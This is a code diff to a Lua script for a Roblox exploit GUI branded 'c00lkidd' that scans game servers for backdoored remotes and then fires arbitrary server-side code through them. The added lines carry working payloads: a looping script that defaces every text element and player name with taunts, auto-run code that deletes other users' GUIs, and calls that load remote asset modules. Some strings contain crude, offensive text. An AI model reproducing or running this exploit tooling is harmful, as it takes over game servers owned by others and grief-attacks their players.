@@ -2240,7 +2240,6 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			return false
 		end
 		if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
-			print('cancelled remote: '..remote:GetFullName())
 			return false
 		end 
 		if EXCLUDED_REMOTES[name] then
@@ -2290,7 +2289,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 				foundEvent = true
 				break
 			end
-			task.wait(0.01)
+			task.wait(0.003)
 		end
 	
 		cleanup()
@@ -2345,17 +2344,17 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	FinishedFound = true
 
 	if not foundExploit then
-		print("c00lkidd: no backdoor found")
+		print("c00lkidd backdoor: False")
 	end
 
 	print(string.format("c00lkidd : scan completed in %.3f seconds", scanTime))
 	end
          local function fireRemoteEvent(code)
 		if remoteEvent then
-			print("ℹ️ Executing code through backdoor:", remoteEvent:GetFullName())
+			print("Executing code:", remoteEvent:GetFullName())
 			remoteEvent:FireServer(code)
 		elseif remoteFunction then
-			print("ℹ️ Executing code through backdoor:", remoteFunction:GetFullName())
+			print("Executing code:", remoteFunction:GetFullName())
 			pcall(function()
 				remoteFunction:InvokeServer('starlightTSS', code)
 			end)
@@ -2436,7 +2435,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		script.Parent.Logs.Visible = false
 	end)
 	script.Parent.Presets.yield.MouseButton1Click:Connect(function()
-           fireRemoteEvent('local function isInCoreGui(obj) while obj.Parent do if obj.Parent == game.CoreGui then return true end obj = obj.Parent end return false end while true do for _, obj in pairs(game:GetDescendants()) do if isInCoreGui(obj) then return true end if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then pcall(function() obj.Font = Enum.Font.Cartoon obj.TextScaled = true obj.Text = "team 👑c00lkidd😭CRY N0W ###SKID###DEATHS#####🙏c00lkidd r0blox GUI@skid INF3XT0r😂😭" obj.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) obj.Rotation = Vector3.new(math.random(-180,180), math.random(-180,180), math.random(-180,180)) obj.Position = UDim2.new(0,math.random(0,400),0,math.random(0,400)) end) end if obj:IsA("Humanoid") then obj.DisplayName = "team😳 c00lkidd👑😜 INFECTOR🤬🙄 AH🪲AH😒AHSHAUAHc00lkidd fUck roBLOXHAHAHA💀A" end if obj:IsA("Frame") then obj.Rotation = Vector3.new(math.random(-180,180), math.random(-180,180), math.random(-180,180)) obj.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) obj.Position = UDim2.new(0,math.random(0,400),0,math.random(0,400)) end if obj:IsA("ImageLabel") then obj.Image = "rbxassetid://8408806737" obj.Rotation = 14 end end task.wait(0.00000000001) end')
+           fireRemoteEvent('local function isInCoreGui(obj) while obj.Parent do if obj.Parent == game.CoreGui then return true end obj = obj.Parent end return false end while true do for _, obj in pairs(game:GetDescendants()) do if isInCoreGui(obj) then return true end if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then pcall(function() obj.Font = Enum.Font.Cartoon obj.TextScaled = true obj.Text = "team 👑c00l😭CRY N0W ###SKID###DEATHS#####🙏c00lr0blox GUI@skid INF3XT0r😂😭" obj.TextColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) obj.Rotation = Vector3.new(math.random(-180,180), math.random(-180,180), math.random(-180,180)) obj.Position = UDim2.new(0,math.random(0,400),0,math.random(0,400)) end) end if obj:IsA("Humanoid") then obj.DisplayName = "team😳 c00lkidd👑😜 INFECTOR🤬🙄 AH🪲AH😒AHSHAUAHc00lkidd fUck roBLOXHAHAHA💀A" end if obj:IsA("Frame") then obj.Rotation = Vector3.new(math.random(-180,180), math.random(-180,180), math.random(-180,180)) obj.BackgroundColor3 = Color3.fromRGB(math.random(0,255), math.random(0,255), math.random(0,255)) obj.Position = UDim2.new(0,math.random(0,400),0,math.random(0,400)) end if obj:IsA("ImageLabel") then obj.Image = "rbxassetid://8408806737" obj.Rotation = 14 end end task.wait(0.00000000001) end')
 	end)
 	script.Parent.Presets.lho.MouseButton1Click:Connect(function()
 		script.Parent.Framee.ScrollingFrame.Frame.TextBox.Text = 'require(10973009971).sonic("' .. game.Players.LocalPlayer.Name ..  '")'
@@ -2513,23 +2512,23 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if remoteEvent or remoteFunction then
 			script.Parent.Framee.Check.Visible = false
 			script.Parent.Framee.Log.Visible = true
-			script.Parent.Framee.Log.Text = "_G." .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "unknown")
+			script.Parent.Framee.Log.Text = "[" .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
 			game.StarterGui:SetCore("SendNotification",{
 				Title = "c00lkidd SS",
-				Text = "Backdoor Found in " .. scanTime .."s! " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "???"),
+				Text = "Backdoor Found in " .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),
 				Duration = 3
 			})
                      -- Auto executes
-	        	fireRemoteEvent('local Players=game:GetService("Players");local suspiciousKeywords={"ranker","pracharatbampen","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban ui","ban gui","itsnotskeleton","l0ck","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","koma","gigxxx","hax0rz","g00l","enstrio","br1cked"};local function isSuspicious(str)str=str:lower();for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end;local function getOwningPlayer(i)local p=i;while p and not p:IsA("PlayerGui")do p=p.Parent end;if p and p:IsA("PlayerGui")then local c=p.Parent;return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end;return nil end;local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name;local t=i:IsA("TextLabel")and i.Text or"";if isSuspicious(n)or isSuspicious(t)then local f=i;while f and not f:IsA("Frame")do f=f.Parent end;if f then local pl=getOwningPlayer(f);local h=Instance.new("Hint",workspace);h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.Name..")"or"");task.delay(3,function()h:Destroy()end);f:Destroy()end end end end;for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end);task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;task.wait(5)end end);')
+	        	fireRemoteEvent('local Players=game:GetService("Players");local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","koma","gigxxx","hax0rz","g00l","enstrio","br1cked"};local function isSuspicious(str)str=str:lower();for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end;local function getOwningPlayer(i)local p=i;while p and not p:IsA("PlayerGui")do p=p.Parent end;if p and p:IsA("PlayerGui")then local c=p.Parent;return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end;return nil end;local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name;local t=i:IsA("TextLabel")and i.Text or"";if isSuspicious(n)or isSuspicious(t)then local f=i;while f and not f:IsA("Frame")do f=f.Parent end;if f then local pl=getOwningPlayer(f);local h=Instance.new("Hint",workspace);h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.Name..")"or"");task.delay(3,function()h:Destroy()end);f:Destroy()end end end end;for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end);task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;task.wait(5)end end);')
                         fireRemoteEvent('for _,p in ipairs(game.Players:GetPlayers())do if p.Name=="greguiscool"or p.Name=="raizarit"then if p.Character and p.Character:FindFirstChild("Head")then local t=Instance.new("BillboardGui");t.Name="NameTag";t.Adornee=p.Character.Head;t.Parent=p.Character.Head;t.Size=UDim2.new(0,200,0,50);t.StudsOffset=Vector3.new(0,2.5,0);t.AlwaysOnTop=true;local l=Instance.new("TextLabel",t);l.Size=UDim2.new(1,0,1,0);l.BackgroundTransparency=1;l.Font=Enum.Font.Arcade;l.TextScaled=true;l.TextColor3=Color3.fromRGB(255,223,0);if p.Name=="greguiscool"then l.Text="👑The Legend👑";elseif p.Name=="raizarit"then l.Text="⚡The Legend⚡";end end end end;local e=Instance.new("Hint",workspace);e.Text="⚡ A Legendary Presence Has Entered the Realm! All Hail the Legend! ⚡";local s=Instance.new("Sound");s.Parent=workspace;s.SoundId="rbxassetid://118529969200894";s.Looped=true;s.Volume=1;s.PlaybackSpeed=1;s.TimePosition=41;s:Play();wait(13.3);local d=2;local w=d/20;local v=s.Volume;for i=1,20 do s.Volume=v*(1-i/20);wait(w);end;s:Stop();e:Destroy();')
                         fireRemoteEvent('require(6735691273).BetaAntiSkid()')
 			fireRemoteEvent('require(7458325257).antiban()')
-                        fireRemoteEvent('require(3986243232).load("No good sir",{"' .. game.Players.LocalPlayer.Name ..  '"})')
+                        fireRemoteEvent('require(3986243232).load("im gay",{"' .. game.Players.LocalPlayer.Name ..  '"})')
 		else
-			script.Parent.Framee.Check.Text = "No Backdoor found"
+			script.Parent.Framee.Check.Text = "No Backdoor found :("
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(226, 69, 69)
-			wait(3)
+			wait(2)
 			script.Parent.Framee.scan.Visible = true
 			script.Parent.Framee.Check.Visible = false
 			script.Parent.Framee.Check.Text = ""
